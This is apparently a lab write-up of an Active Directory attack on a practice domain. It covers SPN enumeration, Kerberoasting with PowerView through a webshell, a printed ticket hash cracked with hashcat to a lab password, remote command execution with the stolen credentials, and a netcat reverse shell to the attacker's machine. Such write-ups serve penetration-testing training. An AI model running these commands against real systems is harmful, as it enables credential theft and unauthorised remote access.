# AD

## Nmap

```
80/tcp    open     http         syn-ack ttl 127
135/tcp   open     msrpc        syn-ack ttl 127
139/tcp   open     netbios-ssn  syn-ack ttl 127
445/tcp   open     microsoft-ds syn-ack ttl 127
5985/tcp  open     wsman        syn-ack ttl 127
47001/tcp open     winrm        syn-ack ttl 127

```

#### Kerberoasting for Windows

To operate the antak webshell, we need to read the [documentation](http://www.labofapenetrationtester.com/2014/06/introducing-antak.html).

Because every comand is executed in a different process, in order to use PowerView.ps1, we need to use them with semicolon.

First, we need to enumerate the SPNs

```
setspn.exe -Q */*
```

```
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
	DNS/DC01.INLANEFREIGHT.LOCAL
	GC/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
	RestrictedKrbHost/DC01.INLANEFREIGHT.LOCAL
	RestrictedKrbHost/DC01
	RPC/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
	HOST/DC01/INLANEFREIGHT
	HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
	HOST/DC01
	HOST/DC01.INLANEFREIGHT.LOCAL
	HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
	E3514235-4B06-11D1-AB04-00C04FC2DCD2/03d2eace-bb3d-467e-a00a-eab0dbfaa065/INLANEFREIGHT.LOCAL
	ldap/DC01/INLANEFREIGHT
	ldap/03d2eace-bb3d-467e-a00a-eab0dbfaa065._msdcs.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
	ldap/DC01
	ldap/DC01.INLANEFREIGHT.LOCAL
	ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	kadmin/changepw
CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL01.inlanefreight.local:1433
CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL02.inlanefreight.local:1433
CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/DEVTEST.inlanefreight.local:1433
CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	MSSQLSvc/QA001.inlanefreight.local:1433
CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	adfsconnect/azure01.inlanefreight.local
CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
	backupjob/veam001.inlanefreight.local
CN=WEB-WIN01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
	RestrictedKrbHost/WEB-WIN01
	HOST/WEB-WIN01
	RestrictedKrbHost/WEB-WIN01.INLANEFREIGHT.LOCAL
	HOST/WEB-WIN01.INLANEFREIGHT.LOCAL
CN=MS01,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
	tapinego/MS01
	tapinego/MS01.INLANEFREIGHT.LOCAL
	TERMSRV/MS01
	TERMSRV/MS01.INLANEFREIGHT.LOCAL
	WSMAN/MS01
	WSMAN/MS01.INLANEFREIGHT.LOCAL
	RestrictedKrbHost/MS01
	HOST/MS01
	RestrictedKrbHost/MS01.INLANEFREIGHT.LOCAL
	HOST/MS01.INLANEFREIGHT.LOCAL

Existing SPN found!
```

After uploading the script with the antak option, we ca use it:

```
Import-Module C:\Windows\Temp\PowerView.ps1;Get-DomainUser * -spn | select samaccountname
```

And from the previus question, we have to use the user `svc_sql`.

Now we use PowerView to Target a Specific User.

```
Import-Module C:\Windows\Temp\PowerView.ps1;Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```

And we obtain the kerberos' tiket:

```
$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$14AF6DAF300136315685173E15C336B1$D95CBB81A901FEFF205BC1376489340FE9E0AC661F6DD5F4E5BB3482DD92EEAC823ACD52803AEC6A83F2D4764497F5B515B4585B4AD1DEB32F10C208DB292456E596EFB82BD5579813AAFFEBDC7F7F23BDB791E01245334109A13B42942D4F198795A86EDECF103711E02A3C97064C213CE6A3089E542C291B6DF1850640E5290EEACDC733A55CE0CFEDD5853CA1280F2291DF753705458D784A0FD45338CFE2D6A0B9C023C9C66F7BB20B5C05FF6AC699F2384A6DA8F5F6AC9B969087AEFACC467F54E6E9D305BFF33E2232C91A99E3F96492809427D31374DF953E2880B0E13F8F9F4287F3F7A418555B707437DDCB210B0E6F8D0DD4CF81B3F45594878DABF81BA762ECDED10EDA047EB8D84A039FBCE4A61DD811F12C9B266A907F00BE814463A03BDFBFABF4C5D807D5E1BB4CB25C6B9583BD8BC5F018EA94675022288DA509178E631ADAB9A314DC4AF05E7CBE43DDDFA933FAD500CE5B03571485834F7A59FC8AC6F9066DC3B1F224DD482CA3297117B18BEE0BF54A038BB97693E5FA39AED30F2EFFFB3C2F56708DC2315DCD857D7480274FD1D550D395D0A6C29250048988E0B77E1B89EDAC8C26D9575ED90561BA01FA8A83EB00A88BB6DE25F6177D9827E03FE0CB89B43985D883999AFEC9E1001B7E0B1C9254A5A4ABC357FDAE550E16D0436D85290DD6F37B524FB1DF55582520CF2F3FC88EDD1EA2D5E5A0E51069A4E809FEF3A94E7EBCB7BFA93C2F16EFC44BB69308D8D67079BBB4747A87E836044A31A77CDDFBDB7A24E5E3D6CB0F843C362E3F1D3E4D58314DB9127C6EBACBBE01A350379E971C0A21B2B626C8FC8AF3E8FA691051AF5F45903A1C888A7EFF7A62D9D402E121ADC73C48CB12BF6BE3AC59A2FCE0F40501AD7FF35E03AD763EAFC70AC3A9E8DB11ADC2220C83D8734852B9C2792969445F95A72B6217A7EE60233AE6A7476E8E6807FB55890B605A3C8EFBAEC4AFFEE6BA4D50242A8C7C47C76E0067914D843663C794D96F113BFBB9211606D4C037B6248C12945E663430F07060707E963FAD1E753C37EABD9E0753D81583ACDADF9334251F28D26F847885E1DD63944DD9DB0B0992AF9011C0A5C3BA012597F597C21DE77A7DFA118096EF4EF96B186A047C973E9CF1825A4D16AB2C795A24D0BBDFB5A28494E994B8DF0B7CCEC2BD6980E9F343BAA0FCA730CF44C0DEBF3FEDFABE48A36A851993B1E74F55A242159692F4E0B9A8EB3379ABA0E2F86EF1619E6258948696340F11F7D3CF6AA1B133E2D49F5E336E67BAA1D177123BF262CA8B9B45F292DC4DA024BBF372149F4F1E72E2479DC1ED5F7C2893763226784A1F279D30B2F0893AEAA521B423145FE1FBADCB86E4E4474CE11148E9241E318D4FF25DFCCBCF39151EDDF2E4C2D2FA47950604AF866BED8BC3C1F9CBC90F3A8A14A68139897C01737699F867B9CEAD1D0E3D946CDF9C7ED0F9DAFD93B7D6ED8FF2DD932BF526AC41FD5D607CDE427C4695063B9E28A372B2EE76E0DFF8985EF59F933E
```

Crack the ticket hash with hashcat:

```
hashcat -m 13100 kerb1 /usr/share/wordlists/rockyou.txt
```

And the password is `lucky7`

In order to execute commands in another computer to type the flag on the desktop, we can modify the generic antak configuration to this:

```
$user = "svc_sql"
$pass = ConvertTo-SecureString -String "lucky7" -asplaintext -force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $pass
Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Scriptblock {type C:\Users\Administrator\Desktop\flag.txt} -Credential $Credential
```

#### NEXT APROACH

To continue, we need another aproach. Instead of using the webshell, lets gain a better shell to pivot and use mimikatz in the second machine.

First we upload the [netcat 64 bits for windows](https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe) and create a reverse shell with our attack machine:

`nc -lnvp 8888` and `nc64.exe -e cmd.exe LIP LPORT` on the windows host.

And now we test the remote connection with the second windows machine using this one liner command and the svc\_sql credentials obtained.

```
Invoke-Command -ComputerName MS01.INLANEFREIGHT.LOCAL -Credential (New-Object PSCredential "svc_sql", (ConvertTo-SecureString "lucky7" -AsPlainText -Force)) -ScriptBlock { ipconfig }

```

